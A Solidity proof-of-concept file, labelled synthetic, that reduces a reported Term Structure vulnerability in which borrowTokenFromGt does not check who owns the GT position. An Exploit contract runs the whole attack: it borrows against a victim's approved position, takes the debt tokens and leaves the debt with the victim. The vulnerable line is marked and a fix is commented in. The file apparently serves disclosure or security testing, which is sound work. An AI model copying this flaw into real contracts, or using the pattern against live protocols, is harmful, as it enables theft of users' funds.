// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Term Structure — borrowTokenFromGt ignores GT ownership (Cantina, 54894)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: after the owner approves the router, anyone can call
    borrowTokenFromGt with that gtId and a recipient of their choosing.
    The call issues FT against the victim's debt and burns it for debt tokens.
    The blamed function is preserved (@> VULN). */

contract ERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
        totalSupply += a;
    }

    function burn(address from, uint256 a) external {
        require(balanceOf[from] >= a, "burn");
        balanceOf[from] -= a;
        totalSupply -= a;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        _move(msg.sender, to, a);
        return true;
    }

    function transferFrom(address from, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        if (al != type(uint256).max) allowance[from][msg.sender] = al - a;
        _move(from, to, a);
        return true;
    }

    function _move(address from, address to, uint256 a) internal {
        require(balanceOf[from] >= a, "bal");
        balanceOf[from] -= a;
        balanceOf[to] += a;
    }
}

contract Gt {
    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public approved;
    mapping(uint256 => uint256) public debtOf;

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
    }

    function approve(address router, uint256 id) external {
        require(msg.sender == ownerOf[id], "owner");
        approved[id] = router;
    }

    function isApproved(uint256 id, address router) external view returns (bool) {
        return approved[id] == router;
    }

    function addDebt(uint256 id, uint256 amt) external {
        debtOf[id] += amt;
    }
}

contract Market {
    ERC20 public ft;
    ERC20 public xt;
    ERC20 public debt;
    Gt public gt;
    uint256 public issueFtFeeRatio;

    constructor(ERC20 _ft, ERC20 _xt, ERC20 _debt, Gt _gt) {
        ft = _ft;
        xt = _xt;
        debt = _debt;
        gt = _gt;
    }

    function tokens() external view returns (ERC20, ERC20, ERC20, ERC20, ERC20) {
        return (ft, xt, debt, debt, debt);
    }

    function mint(address to, uint256 amt) external {
        require(debt.transferFrom(msg.sender, address(this), amt), "debt in");
        ft.mint(to, amt);
        xt.mint(to, amt);
    }

    function issueFtByExistedGt(address to, uint128 debtAmt, uint256 gtId) external returns (uint256) {
        require(gt.isApproved(gtId, msg.sender), "router not approved");
        gt.addDebt(gtId, debtAmt);
        ft.mint(to, debtAmt);
        return debtAmt;
    }

    function burn(address recipient, uint256 amt) external {
        require(ft.transferFrom(msg.sender, address(this), amt), "ft");
        require(xt.transferFrom(msg.sender, address(this), amt), "xt");
        debt.mint(recipient, amt); // STORY5 debt token released to the chosen recipient
    }
}

contract Router {
    uint256 public constant DECIMAL_BASE = 1e8;
    Gt public gt;

    constructor(Gt _gt) { gt = _gt; }

    function borrowTokenFromGt(address recipient, Market market, uint256 gtId, uint256 borrowAmt) external {
        // FIX: require(gt.ownerOf(gtId) == msg.sender);
        (ERC20 ft, ERC20 xt,,,) = market.tokens(); // STORY3
        uint256 issueFtFeeRatio = market.issueFtFeeRatio();
        uint128 debtAmt = uint128((borrowAmt * DECIMAL_BASE) / (DECIMAL_BASE - issueFtFeeRatio));
        uint256 ftOutAmt = market.issueFtByExistedGt(address(this), debtAmt, gtId); // @> VULN: victim gtId, no owner check
        if (ftOutAmt < borrowAmt) borrowAmt = ftOutAmt;
        require(xt.transferFrom(msg.sender, address(this), borrowAmt), "xt in");
        require(ft.approve(address(market), borrowAmt), "ft ap");
        require(xt.approve(address(market), borrowAmt), "xt ap");
        market.burn(recipient, borrowAmt);
    }
}

contract Victim {
    function open(Gt gt, Router router, uint256 id) external {
        gt.mint(address(this), id);
        gt.approve(address(router), id); // STORY2
    }
}

contract Exploit {
    ERC20 public debt; // nonce 1
    ERC20 public ft; // nonce 2
    ERC20 public xt; // nonce 3
    Gt public gt; // nonce 4
    Market public market; // nonce 5
    Router public router; // nonce 6
    Victim public victim; // nonce 7
    uint256 public constant GT_ID = 1;
    uint256 public constant BORROW = 80e8;

    constructor() {
        debt = new ERC20("Debt", "DEBT", 8);
        ft = new ERC20("FT", "FT", 8);
        xt = new ERC20("XT", "XT", 8);
        gt = new Gt();
        market = new Market(ft, xt, debt, gt);
        router = new Router(gt);
        victim = new Victim();
    }

    function run() external {
        debt.mint(address(this), 100e8);
        require(debt.approve(address(market), 100e8), "ap");
        market.mint(address(this), 100e8); // spend 100e8, receive XT. STORY1
        victim.open(gt, router, GT_ID);
        require(gt.ownerOf(GT_ID) == address(victim), "owner");
        require(xt.approve(address(router), BORROW), "xt ap");
        router.borrowTokenFromGt(address(this), market, GT_ID, BORROW);
        require(debt.balanceOf(address(this)) == BORROW, "stolen"); // STORY6
        require(gt.debtOf(GT_ID) == BORROW, "victim debt");
        require(gt.ownerOf(GT_ID) == address(victim), "still victim");
    }
}
